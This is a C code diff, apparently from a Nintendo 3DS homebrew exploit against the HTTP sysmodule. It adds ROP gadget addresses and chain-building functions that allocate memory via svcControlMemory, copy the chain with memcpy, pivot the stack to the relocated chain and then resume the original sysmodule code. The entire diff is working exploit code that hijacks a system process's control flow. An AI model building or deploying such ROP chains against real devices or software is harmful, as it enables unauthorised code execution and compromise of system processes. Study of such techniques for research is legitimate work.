@@ -11,6 +11,8 @@ u32 ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and 
 u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
 u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.
 
+u32 ROP_POPPC = 0x00100208;//"pop {pc}"
+
 u32 ROP_POPR4R5R6PC = 0x00100248;//"pop {r4, r5, r6, pc}"
 
 u32 ROP_POPR1PC = 0x0010cf64;//"pop {r1, pc}"
@@ -26,6 +28,15 @@ u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4
 u32 ROP_POP_R4R5R6R7R8R9SLFPIPPC = 0x00102e10;//"pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"
 
 u32 ROP_ADDR0IP = 0x0010bc2c;//r0+= ip, bx-lr.
+
+u32 ROP_MOVR0R4_POPR4PC = 0x00100698;//"mov r0, r4" "pop {r4, pc}"
+
+u32 ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP = 0x0010f9f0;//"mov r3, r0" "mov r2, r0" "mov r1, r0" "blx ip"
+
+u32 ROP_BLXIP_POPR3PC = 0x00118c08;//"blx ip" "pop {r3, pc}"
+
+u32 ROP_memcpy = 0x0010d274;
+u32 ROP_svcControlMemory = 0x00100770;
 
 void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
 {
@@ -47,6 +58,15 @@ void ropgen_popr3(u32 **ropchain, u32 *http_ropvaddr, u32 value)
 {
 	ropgen_addword(ropchain, http_ropvaddr, ROP_POPR3PC);
 	ropgen_addword(ropchain, http_ropvaddr, value);
+}
+
+void ropgen_setr0(u32 **ropchain, u32 *http_ropvaddr, u32 value)
+{
+	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC + 4);//"pop {r4, pc}"
+	ropgen_addword(ropchain, http_ropvaddr, value);
+
+	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR0R4_POPR4PC);
+	ropgen_addword(ropchain, http_ropvaddr, 0);
 }
 
 void ropgen_popr4r5r6pc(u32 **ropchain, u32 *http_ropvaddr, u32 r4, u32 r5, u32 r6)
@@ -76,28 +96,45 @@ void ropgen_popr4r5r6r7r8r9slfpippc(u32 **ropchain, u32 *http_ropvaddr, u32 *reg
 	for(i=0; i<9; i++)ropgen_addword(ropchain, http_ropvaddr, regs[i]);
 }
 
-void ropgen_blxr3(u32 **ropchain, u32 *http_ropvaddr, u32 addr)
+void ropgen_blxr3(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 writestackret)
 {
 	ropgen_popr3(ropchain, http_ropvaddr, addr);
 
 	ropgen_addword(ropchain, http_ropvaddr, ROP_BLXR3_ADDSP12_POPPC);
-	ropgen_addword(ropchain, http_ropvaddr, 0);
-	ropgen_addword(ropchain, http_ropvaddr, 0);
-	ropgen_addword(ropchain, http_ropvaddr, 0);
+
+	if(writestackret)
+	{
+		ropgen_addword(ropchain, http_ropvaddr, 0);
+		ropgen_addword(ropchain, http_ropvaddr, 0);
+		ropgen_addword(ropchain, http_ropvaddr, 0);
+	}
+}
+
+void ropgen_setr0r2r1(u32 **ropchain, u32 *http_ropvaddr, u32 value)
+{
+	u32 regs[9] = {0};
+
+	ropgen_setr0(ropchain, http_ropvaddr, value);
+
+	regs[8] = ROP_POPPC;
+
+	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);
+
+	ropgen_addword(ropchain, http_ropvaddr, ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP + 4);
 }
 
 void ropgen_ldrr0r1(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 set_addr)
 {
 	if(set_addr)ropgen_popr1(ropchain, http_ropvaddr, addr);
 
-	ropgen_blxr3(ropchain, http_ropvaddr, ROP_LDRR0R1);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_LDRR0R1, 1);
 }
 
 void ropgen_strr0r1(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 set_addr)
 {
 	if(set_addr)ropgen_popr1(ropchain, http_ropvaddr, addr-4);
 
-	ropgen_blxr3(ropchain, http_ropvaddr, ROP_STRR0_R1x4);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_STRR0_R1x4, 1);
 }
 
 void ropgen_copyu32(u32 **ropchain, u32 *http_ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)
@@ -122,10 +159,64 @@ void ropgen_add_r0ip(u32 **ropchain, u32 *http_ropvaddr, u32 addval)//Add the cu
 
 	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);
 
-	ropgen_blxr3(ropchain, http_ropvaddr, ROP_ADDR0IP);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_ADDR0IP, 1);
 }
 
-void init_hax_sharedmem(u32 *tmpbuf)
+void ropgen_blxip_popr3pc(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 r3val)
+{
+	u32 regs[9] = {0};
+
+	regs[8] = addr;
+
+	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);
+
+	ropgen_addword(ropchain, http_ropvaddr, ROP_BLXIP_POPR3PC);
+	ropgen_addword(ropchain, http_ropvaddr, r3val);
+}
+
+void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)
+{
+	ropgen_setr0r2r1(ropchain, http_ropvaddr, params[2]);
+	ropgen_setr0(ropchain, http_ropvaddr, params[0]);
+
+	ropgen_popr1(ropchain, http_ropvaddr, params[1]);
+
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_POPR3PC, 0);
+	ropgen_addword(ropchain, http_ropvaddr, params[3]);
+
+	ropgen_addword(ropchain, http_ropvaddr, funcaddr);
+
+	ropgen_addword(ropchain, http_ropvaddr, params[4]);
+	ropgen_addword(ropchain, http_ropvaddr, params[5]);
+	ropgen_addword(ropchain, http_ropvaddr, params[6]);
+}
+
+void ropgen_svcControlMemory(u32 **ropchain, u32 *http_ropvaddr, u32 outaddr, u32 addr0, u32 addr1, u32 size, MemOp op, MemPerm perm)
+{
+	u32 params[7] = {0};
+
+	params[0] = outaddr;
+	params[1] = addr0;
+	params[2] = addr1;
+	params[3] = size;
+	params[4] = op;
+	params[5] = perm;
+
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_svcControlMemory, params);
+}
+
+void ropgen_memcpy(u32 **ropchain, u32 *http_ropvaddr, u32 dst, u32 src, u32 size)
+{
+	u32 params[7] = {0};
+
+	params[0] = dst;
+	params[1] = src;
+	params[2] = size;
+
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_memcpy, params);
+}
+
+Result init_hax_sharedmem(u32 *tmpbuf)
 {
 	u32 sharedmembase = 0x10006000;
 	u32 target_overwrite_addr;
@@ -137,6 +228,11 @@ void init_hax_sharedmem(u32 *tmpbuf)
 
 	u32 *ropchain_ret2http = &tmpbuf[0xf00>>2];
 	u32 ret2http_vaddr = sharedmembase+0xf00;
+	u32 new_ropvmem = 0x0f000000;
+	u32 ret2http_vaddr_new = new_ropvmem + 0xf00;
+
+	u32 *new_ropchain = &tmpbuf[0x900>>2];
+	u32 http_newropvaddr = sharedmembase+0x900;
 
 	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
 
@@ -189,7 +285,31 @@ void init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x98);//r0 = original value of r6(original_r7+0x98).
 	ropgen_strr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xc, 1);//Write the calculated value for the original r6, to the ret2http ROP.
 
-	ropgen_stackpivot(&ropchain, &http_ropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP.
+	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xfc, new_ropvmem, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
+
+	ropgen_memcpy(&ropchain, &http_ropvaddr, new_ropvmem, http_newropvaddr, 0x600);
+	ropgen_memcpy(&ropchain, &http_ropvaddr, ret2http_vaddr_new, ret2http_vaddr, 0x100);
+
+	ropgen_stackpivot(&ropchain, &http_ropvaddr, new_ropvmem);//Pivot to the relocated ROP-chain.
+
+	if(http_ropvaddr > http_newropvaddr)
+	{
+		printf("http_ropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_ropvaddr - http_newropvaddr));
+		return -2;
+	}
+
+	http_newropvaddr = new_ropvmem;
+	ret2http_vaddr = ret2http_vaddr_new;
+
+	//The relocated ROP-chain starts here.
+
+	ropgen_stackpivot(&new_ropchain, &http_newropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.
+
+	if(http_newropvaddr > ret2http_vaddr)
+	{
+		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - ret2http_vaddr));
+		return -2;
+	}
 
 	regs[7] = 0x0011c418;//Set fp to the original value.
 
@@ -197,5 +317,7 @@ void init_hax_sharedmem(u32 *tmpbuf)
 
 	//Return to executing the original sysmodule code.
 	ropgen_stackpivot(&ropchain_ret2http, &ret2http_vaddr, closecontext_stackframe - 4);
+
+	return 0;
 }
 
